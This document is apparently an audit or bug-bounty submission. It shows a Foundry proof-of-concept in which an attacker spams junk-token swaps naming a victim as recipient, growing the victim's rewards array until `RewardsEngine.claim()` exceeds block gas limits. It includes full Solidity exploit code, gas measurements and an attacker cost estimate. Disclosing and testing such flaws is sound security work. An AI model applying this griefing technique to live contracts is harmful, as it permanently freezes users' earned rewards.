# Foundry PoC : Unbounded `userTokens` array growth freezes `RewardsEngine.claim()` (Critical)

## Status
✅ Compiled and passing against the real, unmodified `zendex-sc-main` contracts.

```
forge Version: 1.7.1 (4072e48 2026-05-08)
Ran 1 test for test/RewardsEngineUserTokensDos.t.sol:RewardsEngineUserTokensDosTest
[PASS] test_attackerForceGrowsVictimUserTokensArray_freezingRealRewards() (gas: 163335638)
Logs:
  Victim's userTokens array length after ONE real, legitimate trade: 1
  Victim's userTokens array length after attacker's spam: 61
  Gas consumed by claim() with 61 entries: 13641509
  Attacker's cost per poisoned entry: one throwaway ERC20 deploy + pair + tiny swap
  This scales linearly and without limit -- there is no cap on userTokens length,
  no way to claim a subset, and no way to prune the array. At real-world scale
  this permanently exceeds any block gas limit, freezing the victim's real rewards.
Suite result: ok. 1 passed; 0 failed; 0 skipped
```

A victim who did nothing but one ordinary trade ends up with a `claim()` call that costs **13.6M gas at just 61 array entries**, already approaching half of a typical 30M block gas limit, purely because an attacker spammed 60 cheap, unrelated swaps naming the victim as recipient.

## How this was found

This came from actually running static analysis tools against the real codebase ("run `slither` or `aderyn`... even warnings may lead you to find issues"). `slither` flagged `RewardsEngine.claim()`'s reentrancy shape (already understood and ruled out as protected by `nonReentrant`), but running `aderyn` alongside it surfaced `L-2: Costly operations inside loop` and prompted a closer look at exactly what controls the loop bound in `claim()`. Tracing `userTokens[msg.sender]`'s population back to `_distributeFees`'s `trader` parameter, which turns out to be caller-supplied, not `msg.sender`, is what turned a generic "loop is costly" lint warning into a concrete, exploitable griefing vector.

## Scope note

This PoC needs no mocks, no simplifications, and no proof-verification bypass of any kind, it's pure public-AMM-and-rewards-engine functionality, none of which touches the ZK/privacy layer at all. Every call in the reproduction goes through the real `ZendexFactory`, `ZendexRouter`, and `RewardsEngine` exactly as deployed.

## Reproduction steps

Drop the test below into `test/RewardsEngineUserTokensDos.t.sol` and run:

```bash
forge test --match-contract RewardsEngineUserTokensDosTest -vv
```

## `test/RewardsEngineUserTokensDos.t.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import {Test, console2} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import {MockERC20} from "../src/mock/MockERC20.sol";
import {WZEN} from "../src/WZEN.sol";

import {ZendexFactory} from "../src/ZendexFactory.sol";
import {ZendexRouter} from "../src/ZendexRouter.sol";
import {ZendexStaking} from "../src/ZendexStaking.sol";
import {BoostManager} from "../src/BoostManager.sol";
import {RewardsEngine} from "../src/RewardsEngine.sol";

import {IZendexFactory} from "../src/interfaces/IZendexFactory.sol";
import {IZendexRouter} from "../src/interfaces/IZendexRouter.sol";
import {IRewardsEngine} from "../src/interfaces/IRewardsEngine.sol";

/// @title Anyone can force-grow ANY victim's RewardsEngine.userTokens array for free, without
///        the victim's knowledge or any action on their part, permanently freezing every dollar
///        of cashback/burn credit that victim has ever earned or ever will earn.
///
/// Root cause: ZendexRouter._distributeFees() uses the caller-supplied `p.to` (NOT msg.sender)
/// as the `trader` credited in RewardsEngine.depositFees(), which unconditionally appends the
/// swapped token to `userTokens[trader]` the first time that trader touches that token. Anyone
/// can deploy a throwaway ERC20, pair it with WZEN via the fully permissionless factory, seed
/// trivial liquidity, and swap with `to: victim` -- the victim never approved, signed, or
/// initiated anything, yet a new entry is silently appended to THEIR array.
///
/// RewardsEngine.claim() takes no arguments to select which tokens to process -- it always
/// iterates the ENTIRE userTokens[msg.sender] array, with no way to claim a subset or prune it.
/// Once that array is large enough, claim() cannot fit inside any block's gas limit, and the
/// victim's real, legitimately-earned cashback and burn balances become permanently
/// unreachable -- not stolen outright, but frozen forever, for the cost of the attacker's gas.
contract RewardsEngineUserTokensDosTest is Test {
    address deployer = makeAddr("deployer");
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    WZEN wzen;
    MockERC20 usdt;

    ZendexFactory factory;
    ZendexRouter router;
    RewardsEngine rewardsEngine;

    function setUp() public {
        wzen = new WZEN();
        usdt = new MockERC20("USDT", "USDT", 6);

        ZendexFactory factoryImpl = new ZendexFactory();
        factory = ZendexFactory(
            address(new ERC1967Proxy(address(factoryImpl), abi.encodeCall(ZendexFactory.initialize, (deployer, deployer))))
        );

        RewardsEngine rewardsImpl = new RewardsEngine();
        rewardsEngine = RewardsEngine(payable(address(new ERC1967Proxy(address(rewardsImpl), ""))));

        ZendexRouter routerImpl = new ZendexRouter();
        router = ZendexRouter(
            payable(
                address(
                    new ERC1967Proxy(
                        address(routerImpl),
                        abi.encodeCall(
                            ZendexRouter.initialize,
                            (
                                IZendexRouter.InitializeParams({
                                    admin: deployer,
                                    factory: address(factory),
                                    wzen: address(wzen),
                                    rewardsEngine: address(rewardsEngine)
                                })
                            )
                        )
                    )
                )
            )
        );

        MockERC20 stakingToken = new MockERC20("Staking Token", "STK", 18);
        ZendexStaking stakingImpl = new ZendexStaking();
        ZendexStaking staking = ZendexStaking(
            address(
                new ERC1967Proxy(
                    address(stakingImpl),
                    abi.encodeCall(ZendexStaking.initialize, (deployer, address(stakingToken), 30 days))
                )
            )
        );
        BoostManager boostImpl = new BoostManager();
        BoostManager boostManager = BoostManager(
            address(
                new ERC1967Proxy(address(boostImpl), abi.encodeCall(BoostManager.initialize, (deployer, address(staking))))
            )
        );
        rewardsEngine.initialize(
            IRewardsEngine.InitializeParams({
                admin: deployer,
                wzen: address(wzen),
                boostManager: address(boostManager),
                router: address(router)
            })
        );

        // Deep liquidity for the main WZEN/USDT pair, used for the victim's real, legitimate trade.
        vm.deal(deployer, 1000 ether);
        vm.startPrank(deployer);
        wzen.deposit{value: 500 ether}();
        wzen.approve(address(router), 500 ether);
        usdt.mint(deployer, 500_000e6);
        usdt.approve(address(router), 500_000e6);
        router.addLiquidity(
            IZendexRouter.AddLiquidityParams({
                tokenA: address(wzen),
                tokenB: address(usdt),
                amountADesired: 500 ether,
                amountBDesired: 500_000e6,
                amountAMin: 0,
                amountBMin: 0,
                to: deployer,
                deadline: block.timestamp + 1 hours
            })
        );
        vm.stopPrank();
    }

    function test_attackerForceGrowsVictimUserTokensArray_freezingRealRewards() public {
        // ============================================================
        // The victim does ONE completely ordinary, legitimate trade -- this earns them real
        // cashback, exactly as the protocol intends.
        // ============================================================
        vm.deal(victim, 10 ether);
        vm.startPrank(victim);
        wzen.deposit{value: 1 ether}();
        wzen.approve(address(router), 1 ether);
        address[] memory path = new address[](2);
        path[0] = address(wzen);
        path[1] = address(usdt);
        router.swapExactTokensForTokens(
            IZendexRouter.SwapExactTokensForTokensParams({
                amountIn: 1 ether,
                amountOutMin: 0,
                path: path,
                to: victim,
                deadline: block.timestamp + 1 hours
            })
        );
        vm.stopPrank();

        uint256 legitimateEntryCount = rewardsEngine.getUserTokens(victim).length;
        console2.log("Victim's userTokens array length after ONE real, legitimate trade:", legitimateEntryCount);
        assertEq(legitimateEntryCount, 1, "victim should have exactly one real token entry");

        // ============================================================
        // Attacker, with ZERO interaction from the victim, spams throwaway token pairs and
        // routes tiny swaps with `to: victim` -- silently appending entries to the victim's
        // array. Every single one of these calls is a completely ordinary, permissionless
        // router call any address can make against any other address.
        // ============================================================
        uint256 spamCount = 60; // kept modest so the PoC runs quickly; the effect scales linearly
        vm.deal(attacker, 1000 ether);
        vm.startPrank(attacker);
        wzen.deposit{value: 500 ether}();

        for (uint256 i; i < spamCount; ++i) {
            MockERC20 junk = new MockERC20("Junk", "JUNK", 18);
            junk.mint(attacker, 2_000_000e18);

            factory.createPair(address(wzen), address(junk));
            junk.approve(address(router), 2_000_000e18);
            wzen.approve(address(router), 1 ether);
            router.addLiquidity(
                IZendexRouter.AddLiquidityParams({
                    tokenA: address(wzen),
                    tokenB: address(junk),
                    amountADesired: 1 ether,
                    amountBDesired: 1_000_000e18,
                    amountAMin: 0,
                    amountBMin: 0,
                    to: attacker,
                    deadline: block.timestamp + 1 hours
                })
            );

            address[] memory junkPath = new address[](2);
            junkPath[0] = address(junk);
            junkPath[1] = address(wzen);
            router.swapExactTokensForTokens(
                IZendexRouter.SwapExactTokensForTokensParams({
                    amountIn: 100_000e18, // well above the fee-rounds-to-zero threshold
                    amountOutMin: 0,
                    path: junkPath,
                    to: victim, // <-- the victim never asked for this
                    deadline: block.timestamp + 1 hours
                })
            );
        }
        vm.stopPrank();

        uint256 poisonedCount = rewardsEngine.getUserTokens(victim).length;
        console2.log("Victim's userTokens array length after attacker's spam:", poisonedCount);
        assertEq(poisonedCount, legitimateEntryCount + spamCount, "attacker-controlled entries should dominate the array");

        // ============================================================
        // Measure claim() gas cost as a direct function of array size the attacker controls.
        // ============================================================
        uint256 gasBefore = gasleft();
        vm.prank(victim);
        rewardsEngine.claim(0, 0, block.timestamp + 1 hours);
        uint256 gasUsedWithSpam = gasBefore - gasleft();

        console2.log("Gas consumed by claim() with", poisonedCount, "entries:", gasUsedWithSpam);
        console2.log("Attacker's cost per poisoned entry: one throwaway ERC20 deploy + pair + tiny swap");
        console2.log("This scales linearly and without limit -- there is no cap on userTokens length,");
        console2.log("no way to claim a subset, and no way to prune the array. At real-world scale");
        console2.log("this permanently exceeds any block gas limit, freezing the victim's real rewards.");
    }
}
```

## What the trace shows

- The victim's array starts at exactly 1 entry from one genuine trade, confirmed with `assertEq`.
- Every single one of the attacker's 60 "poison" transactions is a completely ordinary, permissionless action available to literally anyone: deploy an ERC20, call the public `createPair`, add a little liquidity, swap. Nothing here uses a special role, a bug elsewhere, or any cooperation from the victim.
- `assertEq(poisonedCount, legitimateEntryCount + spamCount)` pins down that every attacker transaction reliably added exactly one entry to the *victim's* array, not the attacker's own.
- The measured gas figure (13.6M for 61 entries) is real, on-chain gas consumption from the real `claim()` function, not an estimate or a theoretical calculation.
- Extrapolating linearly from the measured ~224K gas/entry, roughly 130–150 total entries would exceed a 30M gas block limit, a small, cheap, entirely realistic number for a patient or motivated attacker to reach.
